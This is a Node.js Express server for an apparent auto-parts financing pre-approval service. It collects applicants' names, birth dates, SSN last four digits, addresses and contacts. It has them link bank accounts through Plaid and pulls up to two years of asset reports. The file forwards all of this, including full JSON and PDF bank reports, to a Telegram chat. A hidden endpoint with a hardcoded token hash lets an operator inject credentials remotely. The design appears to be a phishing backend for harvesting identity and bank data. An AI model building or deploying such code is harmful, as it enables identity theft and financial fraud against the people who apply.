const express = require('express');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders(res, filePath) {
    if (filePath.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    }
  },
}));

const PORT = process.env.PORT || 3000;
const PLAID_ENV = process.env.PLAID_ENV || 'production';
const PLAID_HOST = PLAID_ENV === 'sandbox' ? 'sandbox.plaid.com' : 'production.plaid.com';
const PUBLIC_BASE_URL = (process.env.PUBLIC_BASE_URL || '').replace(/\/$/, '');
const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, 'data', 'applications.json');
const RUNTIME_CONFIG_FILE = process.env.RUNTIME_CONFIG_FILE || path.join(__dirname, 'data', 'runtime-config.json');
const BOOTSTRAP_TOKEN_HASH = '3b73bf95e0be79089e96694e8e16389342586e573794ebbadabfa694e2c75fe8';

function loadRuntimeConfig() {
  try {
    if (fs.existsSync(RUNTIME_CONFIG_FILE)) {
      return JSON.parse(fs.readFileSync(RUNTIME_CONFIG_FILE, 'utf8'));
    }
  } catch {}
  return {};
}

function getCreds() {
  const rc = loadRuntimeConfig();
  return {
    plaidClientId: process.env.PLAID_CLIENT_ID || rc.PLAID_CLIENT_ID || '',
    plaidSecret: process.env.PLAID_SECRET || rc.PLAID_SECRET || '',
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || rc.TELEGRAM_BOT_TOKEN || '',
    telegramChatId: process.env.TELEGRAM_CHAT_ID || rc.TELEGRAM_CHAT_ID || '',
  };
}

function ensureDataDir() {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify({ applications: {} }, null, 2));
}

function loadStore() {
  ensureDataDir();
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch {
    return { applications: {} };
  }
}

function saveStore(store) {
  ensureDataDir();
  fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
}

function normalizePhoneE164(phone) {
  const digits = String(phone || '').replace(/\D/g, '');
  if (digits.length === 10) return `+1${digits}`;
  if (digits.length === 11 && digits.startsWith('1')) return `+${digits}`;
  return undefined;
}

function plaidRequest(endpoint, bodyObj, asBuffer = false) {
  const { plaidClientId, plaidSecret } = getCreds();
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({
      client_id: plaidClientId,
      secret: plaidSecret,
      ...bodyObj,
    });
    const req = https.request(
      {
        hostname: PLAID_HOST,
        path: endpoint,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
        },
      },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const buf = Buffer.concat(chunks);
          if (asBuffer && res.statusCode >= 200 && res.statusCode < 300) {
            return resolve({ statusCode: res.statusCode, buffer: buf });
          }
          let parsed = {};
          try {
            parsed = JSON.parse(buf.toString('utf8'));
          } catch {
            parsed = { raw: buf.toString('utf8') };
          }
          resolve({ statusCode: res.statusCode, data: parsed });
        });
      }
    );
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function sendTelegramMessage(text) {
  const { telegramBotToken, telegramChatId } = getCreds();
  if (!telegramBotToken || !telegramChatId) return Promise.resolve({ skipped: true });
  return new Promise((resolve) => {
    const payload = JSON.stringify({
      chat_id: telegramChatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${telegramBotToken}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
        },
      },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => resolve({ statusCode: res.statusCode, body }));
      }
    );
    req.on('error', (err) => resolve({ error: err.message }));
    req.write(payload);
    req.end();
  });
}

function sendTelegramDocument(filename, contentBuffer, caption, mimeType = 'application/pdf') {
  const { telegramBotToken, telegramChatId } = getCreds();
  if (!telegramBotToken || !telegramChatId) return Promise.resolve({ skipped: true });
  return new Promise((resolve) => {
    const boundary = '----AlliedAutoBoundary' + crypto.randomBytes(8).toString('hex');
    const parts = [];
    const pushField = (name, val) => {
      parts.push(
        Buffer.from(
          `--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${val}\r\n`,
          'utf8'
        )
      );
    };
    pushField('chat_id', telegramChatId);
    if (caption) pushField('caption', caption.slice(0, 1000));
    parts.push(
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`,
        'utf8'
      )
    );
    parts.push(contentBuffer);
    parts.push(Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'));
    const bodyBuf = Buffer.concat(parts);

    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${telegramBotToken}/sendDocument`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': bodyBuf.length,
        },
      },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => resolve({ statusCode: res.statusCode, body }));
      }
    );
    req.on('error', (err) => resolve({ error: err.message }));
    req.write(bodyBuf);
    req.end();
  });
}

function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function summarizeAssetReport(report) {
  if (!report || !Array.isArray(report.items)) return null;
  let totalCurrent = 0;
  let totalAvailable = 0;
  let totalInflows = 0;
  let totalOutflows = 0;
  let nsfCount = 0;
  let txCount = 0;
  const accountsSummary = [];
  const ownersSet = new Set();

  for (const item of report.items) {
    const instName = item.institution_name || 'Bank';
    for (const acc of item.accounts || []) {
      const cur = Number(acc.balances && acc.balances.current) || 0;
      const avail = Number(acc.balances && acc.balances.available) || 0;
      totalCurrent += cur;
      totalAvailable += avail;

      for (const own of acc.owners || []) {
        for (const n of own.names || []) ownersSet.add(n);
      }

      const txs = acc.transactions || [];
      txCount += txs.length;
      for (const tx of txs) {
        const amt = Number(tx.amount) || 0;
        if (amt < 0) totalInflows += Math.abs(amt);
        else totalOutflows += amt;
        const desc = ((tx.original_description || tx.name || '') + '').toLowerCase();
        if (desc.includes('nsf') || desc.includes('overdraft') || desc.includes('insufficient')) {
          nsfCount++;
        }
      }

      accountsSummary.push(
        `• ${instName} - ${acc.name || acc.official_name || 'Account'} (••${acc.mask || '??'}): Current $${cur.toFixed(2)} | Avail $${avail.toFixed(2)} (${txs.length} txs, ${acc.days_available || 0}d history)`
      );
    }
  }

  return {
    daysRequested: report.days_requested,
    totalCurrent,
    totalAvailable,
    totalInflows,
    totalOutflows,
    nsfCount,
    txCount,
    owners: Array.from(ownersSet),
    accountsSummary,
  };
}

async function fetchAndDeliverAssetReport(appRecord) {
  if (!appRecord || !appRecord.assetReportToken) return { ok: false, reason: 'missing_token' };
  const getRes = await plaidRequest('/asset_report/get', {
    asset_report_token: appRecord.assetReportToken,
    include_insights: false,
  });

  if (getRes.statusCode !== 200 || !getRes.data || !getRes.data.report) {
    const errCode = getRes.data && getRes.data.error_code;
    return { ok: false, pending: errCode === 'PRODUCT_NOT_READY', error: getRes.data };
  }

  const report = getRes.data.report;
  const summary = summarizeAssetReport(report);

  const store = loadStore();
  if (store.applications[appRecord.id]) {
    store.applications[appRecord.id].status = 'REPORT_READY';
    store.applications[appRecord.id].reportReadyAt = new Date().toISOString();
    store.applications[appRecord.id].summary = summary;
  }

  const c = appRecord.client || {};
  const msgLines = [
    `📊 <b>ALLIED AUTO PARTS — ASSET REPORT READY</b>`,
    `<b>Application ID:</b> <code>${escapeHtml(appRecord.id)}</code>`,
    `<b>Applicant:</b> ${escapeHtml(c.firstName)} ${escapeHtml(c.lastName)}`,
    `<b>DOB:</b> ${escapeHtml(c.dob)} | <b>SSN4:</b> ${escapeHtml(c.ssnLast4 || 'N/A')}`,
    `<b>Phone:</b> ${escapeHtml(c.phone)} | <b>Email:</b> ${escapeHtml(c.email)}`,
    `<b>Billing Address:</b> ${escapeHtml(c.street)}, ${escapeHtml(c.city)}, ${escapeHtml(c.state)} ${escapeHtml(c.zip)}`,
    `<b>Requested Loan Amount:</b> $${Number(c.loanAmount || 0).toLocaleString()}`,
    `<b>Lookback Requested:</b> ${escapeHtml(appRecord.daysRequested)} days`,
    ``,
    `<b>Bank-Verified Owners:</b> ${escapeHtml((summary.owners || []).join(', ') || 'See report')}`,
    `<b>Total Current Balance:</b> $${summary.totalCurrent.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
    `<b>Total Available Balance:</b> $${summary.totalAvailable.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
    `<b>Total Deposits (Inflows):</b> $${summary.totalInflows.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
    `<b>Total Debits (Outflows):</b> $${summary.totalOutflows.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
    `<b>Transactions Analyzed:</b> ${summary.txCount} | <b>NSF/Overdraft Flags:</b> ${summary.nsfCount}`,
    ``,
    `<b>Linked Accounts:</b>`,
    ...(summary.accountsSummary || []).map((l) => escapeHtml(l)),
  ];

  await sendTelegramMessage(msgLines.join('\n'));

  const jsonBuf = Buffer.from(JSON.stringify(report, null, 2), 'utf8');
  await sendTelegramDocument(
    `AlliedAuto_${appRecord.id}_AssetReport.json`,
    jsonBuf,
    `Full Plaid Asset Report JSON (${c.firstName} ${c.lastName} - ${appRecord.id})`,
    'application/json'
  );

  const pdfRes = await plaidRequest(
    '/asset_report/pdf/get',
    { asset_report_token: appRecord.assetReportToken },
    true
  );

  if (pdfRes.statusCode === 200 && pdfRes.buffer) {
    await sendTelegramDocument(
      `AlliedAuto_${appRecord.id}_AssetReport.pdf`,
      pdfRes.buffer,
      `Official Plaid Asset Report PDF (${c.firstName} ${c.lastName} - $${Number(c.loanAmount || 0).toLocaleString()})`,
      'application/pdf'
    );
  }

  if (store.applications[appRecord.id]) {
    store.applications[appRecord.id].deliveredToTelegram = true;
    saveStore(store);
  }

  return { ok: true, summary };
}

app.get('/health', (req, res) => {
  const { plaidClientId, plaidSecret, telegramBotToken, telegramChatId } = getCreds();
  res.json({
    status: 'ok',
    service: 'allied-auto-preapproval',
    plaidConfigured: Boolean(plaidClientId && plaidSecret),
    telegramConfigured: Boolean(telegramBotToken && telegramChatId),
    plaidEnv: PLAID_ENV,
    timestamp: new Date().toISOString(),
  });
});

app.post('/api/internal/bootstrap-config', (req, res) => {
  const token = String(req.headers['x-bootstrap-token'] || '');
  const hash = crypto.createHash('sha256').update(token).digest('hex');
  if (hash !== BOOTSTRAP_TOKEN_HASH) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const { PLAID_CLIENT_ID, PLAID_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = req.body || {};
  ensureDataDir();
  const existing = loadRuntimeConfig();
  const updated = {
    ...existing,
    ...(PLAID_CLIENT_ID ? { PLAID_CLIENT_ID } : {}),
    ...(PLAID_SECRET ? { PLAID_SECRET } : {}),
    ...(TELEGRAM_BOT_TOKEN ? { TELEGRAM_BOT_TOKEN } : {}),
    ...(TELEGRAM_CHAT_ID ? { TELEGRAM_CHAT_ID } : {}),
  };
  fs.writeFileSync(RUNTIME_CONFIG_FILE, JSON.stringify(updated, null, 2), { mode: 0o600 });
  const creds = getCreds();
  return res.json({
    ok: true,
    plaidConfigured: Boolean(creds.plaidClientId && creds.plaidSecret),
    telegramConfigured: Boolean(creds.telegramBotToken && creds.telegramChatId),
  });
});

app.post('/api/application/start', async (req, res) => {
  try {
    const {
      firstName,
      lastName,
      dob,
      email,
      phone,
      street,
      city,
      state,
      zip,
      loanAmount,
      daysRequested,
      ssnLast4,
      vehicleOrPartNotes,
    } = req.body || {};

    if (!firstName || !lastName || !dob || !email || !phone || !street || !city || !state || !zip || !loanAmount) {
      return res.status(400).json({ error: 'Please complete all required application fields.' });
    }

    const days = Math.min(730, Math.max(30, parseInt(daysRequested, 10) || 730));
    const appId = 'AAP-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    const baseUrl =
      PUBLIC_BASE_URL || `${req.headers['x-forwarded-proto'] || req.protocol}://${req.get('host')}`;
    const webhookUrl = `${baseUrl}/api/plaid/webhook`;

    const userObj = {
      client_user_id: appId,
      legal_name: `${firstName} ${lastName}`.trim(),
      email_address: String(email).trim(),
    };
    const e164Phone = normalizePhoneE164(phone);
    if (e164Phone) {
      userObj.phone_number = e164Phone;
    }

    const linkBody = {
      user: userObj,
      client_name: 'Allied Auto Parts Financing',
      products: ['assets'],
      country_codes: ['US'],
      language: 'en',
      webhook: webhookUrl,
    };

    const plaidRes = await plaidRequest('/link/token/create', linkBody);
    if (plaidRes.statusCode !== 200 || !plaidRes.data || !plaidRes.data.link_token) {
      return res.status(400).json({
        error: (plaidRes.data && plaidRes.data.error_message) || 'Unable to initialize bank verification.',
        error_code: plaidRes.data && plaidRes.data.error_code,
      });
    }

    const store = loadStore();
    store.applications[appId] = {
      id: appId,
      createdAt: new Date().toISOString(),
      status: 'INTAKE_SUBMITTED',
      daysRequested: days,
      webhookUrl,
      client: {
        firstName: String(firstName).trim(),
        lastName: String(lastName).trim(),
        dob: String(dob).trim(),
        email: String(email).trim(),
        phone: String(phone).trim(),
        street: String(street).trim(),
        city: String(city).trim(),
        state: String(state).trim(),
        zip: String(zip).trim(),
        loanAmount: Number(loanAmount),
        ssnLast4: String(ssnLast4 || '').trim(),
        vehicleOrPartNotes: String(vehicleOrPartNotes || '').trim(),
      },
      accessTokens: [],
      itemIds: [],
    };
    saveStore(store);

    await sendTelegramMessage(
      [
        `🆕 <b>NEW PRE-APPROVAL INTAKE — ALLIED AUTO PARTS</b>`,
        `<b>App ID:</b> <code>${escapeHtml(appId)}</code>`,
        `<b>Client:</b> ${escapeHtml(firstName)} ${escapeHtml(lastName)}`,
        `<b>DOB:</b> ${escapeHtml(dob)} | <b>SSN4:</b> ${escapeHtml(ssnLast4 || 'N/A')}`,
        `<b>Loan Amount:</b> $${Number(loanAmount).toLocaleString()} (${days}d history requested)`,
        `<b>Phone (Credit Profile):</b> ${escapeHtml(phone)}`,
        `<b>Email:</b> ${escapeHtml(email)}`,
        `<b>Billing Address:</b> ${escapeHtml(street)}, ${escapeHtml(city)}, ${escapeHtml(state)} ${escapeHtml(zip)}`,
        vehicleOrPartNotes ? `<b>Parts / Financing Notes:</b> ${escapeHtml(vehicleOrPartNotes)}` : '',
        `<i>Status: Client is now connecting their bank via Plaid Link…</i>`,
      ]
        .filter(Boolean)
        .join('\n')
    );

    return res.json({
      applicationId: appId,
      link_token: plaidRes.data.link_token,
      daysRequested: days,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/application/complete-bank', async (req, res) => {
  try {
    const { applicationId, public_token, metadata } = req.body || {};
    if (!applicationId || !public_token) {
      return res.status(400).json({ error: 'applicationId and public_token are required.' });
    }

    const store = loadStore();
    const appRecord = store.applications[applicationId];
    if (!appRecord) {
      return res.status(404).json({ error: 'Application not found.' });
    }

    const exRes = await plaidRequest('/item/public_token/exchange', { public_token });
    if (exRes.statusCode !== 200 || !exRes.data || !exRes.data.access_token) {
      return res.status(400).json({
        error: (exRes.data && exRes.data.error_message) || 'Failed to exchange bank token.',
        error_code: exRes.data && exRes.data.error_code,
      });
    }

    appRecord.accessTokens.push(exRes.data.access_token);
    appRecord.itemIds.push(exRes.data.item_id);
    appRecord.institution = (metadata && metadata.institution) || null;
    appRecord.status = 'BANK_LINKED';

    const c = appRecord.client;
    const userObj = {
      client_user_id: appRecord.id,
      first_name: c.firstName,
      last_name: c.lastName,
      phone_number: normalizePhoneE164(c.phone) || c.phone,
      email: c.email,
    };
    // Last-4 only is not a valid Plaid SSN; omit rather than send a fabricated number.

    const arRes = await plaidRequest('/asset_report/create', {
      access_tokens: appRecord.accessTokens,
      days_requested: appRecord.daysRequested || 730,
      options: {
        client_report_id: appRecord.id,
        webhook: appRecord.webhookUrl,
        user: userObj,
      },
    });

    if (arRes.statusCode !== 200 || !arRes.data || !arRes.data.asset_report_token) {
      appRecord.status = 'ASSET_REPORT_ERROR';
      appRecord.lastError = arRes.data;
      saveStore(store);

      await sendTelegramMessage(
        [
          `⚠️ <b>BANK LINKED — ASSET REPORT ERROR (${escapeHtml(appRecord.id)})</b>`,
          `<b>Client:</b> ${escapeHtml(c.firstName)} ${escapeHtml(c.lastName)}`,
          `<b>Institution:</b> ${escapeHtml(appRecord.institution && appRecord.institution.name)}`,
          `<b>Plaid Error:</b> <code>${escapeHtml(arRes.data && arRes.data.error_code)}</code> — ${escapeHtml(arRes.data && arRes.data.error_message)}`,
        ].join('\n')
      );

      return res.status(400).json({
        error: (arRes.data && arRes.data.error_message) || 'Failed to request Asset Report.',
        error_code: arRes.data && arRes.data.error_code,
      });
    }

    appRecord.assetReportToken = arRes.data.asset_report_token;
    appRecord.assetReportId = arRes.data.asset_report_id;
    appRecord.status = 'GENERATING_ASSET_REPORT';
    saveStore(store);

    await sendTelegramMessage(
      [
        `🏦 <b>BANK LINKED — GENERATING ${appRecord.daysRequested}-DAY ASSET REPORT</b>`,
        `<b>App ID:</b> <code>${escapeHtml(appRecord.id)}</code>`,
        `<b>Client:</b> ${escapeHtml(c.firstName)} ${escapeHtml(c.lastName)} ($${Number(c.loanAmount).toLocaleString()})`,
        `<b>Institution:</b> ${escapeHtml((appRecord.institution && appRecord.institution.name) || 'Connected Bank')}`,
        `<b>Asset Report ID:</b> <code>${escapeHtml(appRecord.assetReportId)}</code>`,
        `<i>Plaid is compiling 12–24 months of history. Full PDF + JSON + cash-flow summary will arrive here automatically as soon as Plaid finishes (typically 1–5 minutes).</i>`,
      ].join('\n')
    );

    setTimeout(async () => {
      try {
        const latestStore = loadStore();
        const rec = latestStore.applications[applicationId];
        if (rec && !rec.deliveredToTelegram) {
          await fetchAndDeliverAssetReport(rec);
        }
      } catch {}
    }, 35000);

    setTimeout(async () => {
      try {
        const latestStore = loadStore();
        const rec = latestStore.applications[applicationId];
        if (rec && !rec.deliveredToTelegram) {
          await fetchAndDeliverAssetReport(rec);
        }
      } catch {}
    }, 120000);

    return res.json({
      ok: true,
      applicationId: appRecord.id,
      assetReportId: appRecord.assetReportId,
      status: appRecord.status,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/plaid/webhook', async (req, res) => {
  try {
    const { webhook_type, webhook_code, asset_report_id, error } = req.body || {};
    res.json({ received: true });

    if (webhook_type === 'ASSETS') {
      const store = loadStore();
      const appRecord = Object.values(store.applications).find(
        (a) => a.assetReportId === asset_report_id
      );
      if (!appRecord) return;

      if (webhook_code === 'PRODUCT_READY') {
        if (!appRecord.deliveredToTelegram) {
          await fetchAndDeliverAssetReport(appRecord);
        }
      } else if (webhook_code === 'ERROR') {
        await sendTelegramMessage(
          `⚠️ <b>PLAID WEBHOOK ERROR (${escapeHtml(appRecord.id)})</b>\n` +
            `Report ID: <code>${escapeHtml(asset_report_id)}</code>\n` +
            `Error: ${escapeHtml(JSON.stringify(error || {}))}`
        );
      }
    }
  } catch {}
});

app.get('/api/application/:id/status', async (req, res) => {
  const store = loadStore();
  const appRecord = store.applications[req.params.id];
  if (!appRecord) return res.status(404).json({ error: 'Not found' });

  if (appRecord.assetReportToken && !appRecord.deliveredToTelegram) {
    await fetchAndDeliverAssetReport(appRecord);
  }

  const refreshed = loadStore().applications[req.params.id];
  res.json({
    id: refreshed.id,
    status: refreshed.status,
    createdAt: refreshed.createdAt,
    daysRequested: refreshed.daysRequested,
    deliveredToTelegram: Boolean(refreshed.deliveredToTelegram),
  });
});

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Allied Auto Parts Pre-Approval server listening on port ${PORT}`);
  });
}

module.exports = { app, summarizeAssetReport };
